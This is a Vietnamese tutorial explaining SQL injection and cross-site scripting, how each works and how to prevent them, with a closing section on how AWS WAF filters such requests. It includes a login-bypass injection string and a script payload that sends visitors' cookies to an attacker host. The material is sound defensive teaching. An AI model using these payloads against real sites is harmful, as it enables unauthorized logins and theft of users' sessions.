# Các Tấn Công Web Phổ Biến

## SQL Injection

SQL Injection là một kỹ thuật tấn công mạng trong đó kẻ tấn công chèn mã SQL độc hại vào các đầu vào được sử dụng trong ứng dụng web nhằm truy cập trái phép hoặc thay đổi dữ liệu trong cơ sở dữ liệu.

### Cách Thức Hoạt Động:

1. Ứng dụng web sử dụng đầu vào từ người dùng để xây dựng câu truy vấn SQL
2. Kẻ tấn công nhập các ký tự đặc biệt và mã SQL vào các trường đầu vào
3. Mã độc được thực thi khi ứng dụng chạy câu truy vấn

### Ví dụ:

- **Truy vấn ban đầu**: `SELECT * FROM users WHERE username='[nhập_vào]' AND password='[nhập_vào]'`
- **Đầu vào độc hại**: Username: `' OR '1'='1` và Password: `' OR '1'='1`
- **Kết quả truy vấn**: `SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'`
- **Hậu quả**: Truy vấn luôn trả về true, cho phép đăng nhập mà không cần mật khẩu hợp lệ

### Phòng Chống:

- Sử dụng câu lệnh được tham số hóa (Parameterized Queries)
- Xác thực và làm sạch đầu vào người dùng
- Áp dụng nguyên tắc đặc quyền tối thiểu cho tài khoản cơ sở dữ liệu
- Sử dụng WAF để lọc các mẫu tấn công SQL Injection phổ biến

## Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) là một lỗ hổng bảo mật cho phép kẻ tấn công chèn mã script (thường là JavaScript) vào các trang web mà người dùng khác xem. Khi người dùng tải trang, script độc hại sẽ chạy trong trình duyệt của họ.

### Các Loại XSS:

1. **Stored XSS (XSS Lưu Trữ)**: Script độc hại được lưu trữ trên máy chủ (ví dụ: trong cơ sở dữ liệu, diễn đàn, bình luận)
2. **Reflected XSS (XSS Phản Xạ)**: Script độc hại được nhúng vào URL và chỉ ảnh hưởng đến người dùng nhấp vào liên kết đó
3. **DOM-based XSS**: Script độc hại thao tác với cấu trúc DOM của trang mà không qua máy chủ

### Ví dụ:

- **Bình luận độc hại**: `<script>document.location='http://hacker.com/steal.php?cookie='+document.cookie</script>`
- **Kết quả**: Khi người dùng xem trang có bình luận này, cookie của họ sẽ bị gửi đến máy chủ của kẻ tấn công

### Các Mối Đe Dọa:

- Đánh cắp phiên đăng nhập (session hijacking)
- Đánh cắp thông tin cá nhân
- Thay đổi nội dung trang web
- Phishing bằng cách chuyển hướng người dùng đến trang giả mạo
- Cài đặt mã độc

### Phòng Chống:

- Mã hóa đầu ra (output encoding)
- Xác thực đầu vào chặt chẽ
- Sử dụng các HTTP headers bảo mật như Content-Security-Policy
- Sử dụng thẻ HttpOnly cho cookies quan trọng
- Triển khai WAF để lọc các mẫu tấn công XSS phổ biến

## Tầm Quan Trọng Của WAF Trong Việc Phòng Chống

AWS WAF được thiết kế đặc biệt để phát hiện và ngăn chặn các tấn công web phổ biến như SQL Injection và XSS. Nó có thể kiểm tra các yếu tố của HTTP request như:

- URL paths
- Query strings
- HTTP headers
- HTTP method
- Thân request (body)

WAF sử dụng các quy tắc và mẫu để xác định và chặn các request độc hại trước khi chúng đến được ứng dụng web của bạn, giúp bảo vệ ứng dụng khỏi các lỗ hổng bảo mật web phổ biến.
